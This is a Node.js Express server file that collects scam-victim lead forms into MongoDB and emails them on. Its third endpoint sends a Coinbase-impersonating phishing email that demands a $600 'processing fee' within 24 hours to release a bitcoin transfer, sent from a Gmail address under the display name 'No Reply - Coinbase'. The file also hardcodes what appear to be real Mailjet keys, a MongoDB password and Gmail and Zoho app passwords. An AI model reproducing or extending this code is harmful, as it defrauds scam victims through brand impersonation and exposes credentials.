const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const mongoose = require('mongoose');
let apikey = '0e1db7ff20a3e43b3a488aabfbb1b80c'
let secretKey = '9ef8bad0830c18dead21c12feb95c328'

// Adjust the import so that if a default export exists, use it:
// Use apiConnect instead of connect:
const mailjetClient = require('node-mailjet').apiConnect(
  apikey,
  secretKey
);

// Initialize Express
const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
const uri = "mongodb+srv://segunajanaku617:L2EWpkDTx9wBj4hw@cluster0.q1lhe.mongodb.net/?retryWrites=true&w=majority";
mongoose.connect(uri,)
  .then(() => console.log('MongoDB connected'))
  .catch(err => console.error('MongoDB connection error:', err));

// Define the Email Schema
const emailSchema = new mongoose.Schema({
  formname: String,
  utm_source: String,
  utm_medium: String,
  utm_campaign: String,
  utm_term: String,
  gclid_field: String,
  ip: String,
  page_url: String,
  dial_code: String,
  fname: String,
  lname: String,
  email: String,
  mobile_no: String,
  country: String,
  scam_type: String,
  amount: String,
  message: String,
  createdAt: { type: Date, default: Date.now },
});
const emailSchema2 = new mongoose.Schema({
  formname: String, utm_source: String, utm_medium: String, utm_campaign: String, utm_term: String, gclid_field: String, ip: String,
  page_url: String, dial_code: String, fname: String, email: String, mobile_no: String, amount: String, message: String,
  createdAt: { type: Date, default: Date.now },
});

const Email = mongoose.model('Email', emailSchema);
const Email2 = mongoose.model('Email2', emailSchema2);


// Configure NodeMailer with Zoho Mail
// const transporter = nodemailer.createTransport({
//     host: 'smtp.zoho.com', // Zoho SMTP server
//     port: 465, // Secure SMTP port
//     secure: true, // Use SSL
//     auth: {
//         user: 'support@financemoneyrecovery.com', // Your Zoho email
//         pass: 'GFpxSVhEaDab', // Your Zoho app password
//     },
// });

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'segunajanaku617@gmail.com', // Your Gmail address
    pass: 'lylz uryf tfsg oame', // Your App Password
  },
});


// Endpoint: Send Email and Save Data (Generalized)
app.post('/send-email', async (req, res) => {
  const payload = req.body;

  // Validate required fields
  if (!payload.fname || !payload.email || !payload.message) {
    return res.status(400).json({ error: 'First name, email, and message are required.' });
  }

  try {
    // Save payload to MongoDB
    const emailData = new Email(payload);
    await emailData.save();
    console.log('Payload saved successfully.');

    // Email content
    const mailOptions = {
      from: 'support@financemoneyrecovery.com', // Sender's email
      to: 'support@financemoneyrecovery.com', // Recipient's email
      subject: `New message from ${payload.fname} ${payload.lname || ''}`,
      text: `
                Form Name: ${payload.formname || 'Not provided'}
                UTM Source: ${payload.utm_source || 'Not provided'}
                UTM Medium: ${payload.utm_medium || 'Not provided'}
                UTM Campaign: ${payload.utm_campaign || 'Not provided'}
                UTM Term: ${payload.utm_term || 'Not provided'}
                GCLID: ${payload.gclid_field || 'Not provided'}
                IP: ${payload.ip || 'Not provided'}
                Page URL: ${payload.page_url || 'Not provided'}
                Dial Code: ${payload.dial_code || 'Not provided'}
                First Name: ${payload.fname}
                Last Name: ${payload.lname || 'Not provided'}
                Email: ${payload.email}
                Mobile Number: ${payload.mobile_no || 'Not provided'}
                Country: ${payload.country || 'Not provided'}
                Scam Type: ${payload.scam_type || 'Not provided'}
                Amount: ${payload.amount || 'Not provided'}
                Message: ${payload.message}
            `,
    };

    // Send email
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: 'Email sent and data saved successfully.' });
  } catch (err) {
    console.error('Error processing request:', err.message);
    res.status(500).json({ error: 'Failed to save data or send email.' });
  }
});

app.post('/send-email-2', async (req, res) => {
  const {
    formname, utm_source, utm_medium, utm_campaign, utm_term, gclid_field, ip,
    page_url, dial_code, fname, email, mobile_no, amount, message
  } = req.body;
  const emailData = new Email2(payload);
  await emailData.save();
  console.log('Payload saved successfully.');

  // Validate required fields
  if (!fname || !email || !message) {
    return res.status(400).json({ error: 'First name, email, and message are required.' });
  }

  // Email content
  const mailOptions = {
    from: 'support@financemoneyrecovery.com', // Sender's email
    to: 'support@financemoneyrecovery.com', // Recipient's email
    subject: `New message from ${fname}`,
    text: `
            Form Name: ${formname || 'Not provided'}
            UTM Source: ${utm_source || 'Not provided'}
            UTM Medium: ${utm_medium || 'Not provided'}
            UTM Campaign: ${utm_campaign || 'Not provided'}
            UTM Term: ${utm_term || 'Not provided'}
            GCLID: ${gclid_field || 'Not provided'}
            IP: ${ip || 'Not provided'}
            Page URL: ${page_url || 'Not provided'}
            Dial Code: ${dial_code || 'Not provided'}
            Full Name: ${fname}
            Email: ${email}
            Mobile Number: ${mobile_no || 'Not provided'}
            Amount: ${amount || 'Not provided'}
            Message: ${message}
        `,
  };



  try {
    // Send email
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: 'Email sent successfully.' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ error: 'Failed to send email.' });
  }
});

/**
 *
 * Run:
 *
 */



app.post('/send-welcome-email-2', async (req, res) => {
  const { name, email } = req.body;

  // Validate required fields
  if (!name || !email) {
    return res.status(400).json({ error: 'Name and email are required for welcome email.' });
  }

  // Professional HTML email template with personalized content
  const htmlContent = `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Coinbase Transfer Confirmation Required</title>
    <style>
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 0; background-color: #f5f5f5; }
        .container { max-width: 600px; margin: 20px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .header { text-align: center; border-bottom: 2px solid #1652F0; padding-bottom: 15px; }
        .logo { width: 180px; }
        .content { padding: 20px 0; }
        .button { display: inline-block; background: #1652F0; color: white !important; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 15px 0; }
        .footer { text-align: center; font-size: 12px; color: #666; margin-top: 20px; }
        .warning { color: #ff0000; font-weight: bold; }
        .highlight { color: #1652F0; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="logo.png" alt="Coinbase Logo" class="logo">
            <h2 style="color: #1652F0; margin-top: 10px;">Transfer Authorization Required</h2>
        </div>

        <div class="content">
            <p>Dear Henry,</p>
            <p>Your recent request to transfer <span class="highlight">1.112 BTC</span> requires additional authorization. To comply with financial regulations (AML/KYC), a <strong>processing fee of $600 USD</strong> must be paid to complete this transaction.</p>
            
           

            <p class="warning">⚠️ Deadline: Complete within 24 hours to avoid cancellation of this transfer.</p>

            <p>If you did not initiate this transfer, contact our security team immediately at <a href="mailto:security@coinbase.com">security@coinbase.com</a>.</p>
        </div>

        <div class="footer">
            <p>Coinbase Support Team<br>
            <em>Building the Future of Finance</em></p>
            <p style="font-size: 10px; color: #999;">
                This is an automated message. Do not reply directly.<br>
                248 3rd St, San Francisco, CA 94103, USA<br>
                <a href="#" style="color: #666;">Privacy Policy</a> | <a href="#" style="color: #666;">Terms of Service</a> | <a href="#" style="color: #666;">Unsubscribe</a>
            </p>
          
        </div>
    </div>
</body>
</html>
  `;

  // Prepare Mailjet message data
  const mailData = {
    Messages: [
      {
        From: {
          Email: 'joey.mendez699@gmail.com', // Ensure SENDER_EMAIL is set in your environment
          Name: 'No Reply - Coinbase',
        },
        To: [
          {
            Email: email,
            Name: name,
          },
        ],
        Subject: 'Your Transfer Authorization is Required',
        TextPart: '',
        HTMLPart: htmlContent,
      },
    ],
  };

  try {
    // Send the email using Mailjet's API (v3.1)
    const result = await mailjetClient
      .post('send', { version: 'v3.1' })
      .request(mailData);
    console.log(result.body);
    res.status(200).json({ success: 'Welcome email sent successfully.' });
  } catch (error) {
    console.error('Error sending welcome email:', error);
    res.status(500).json({ error: 'Failed to send welcome email.' });
  }
});






// Start the server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
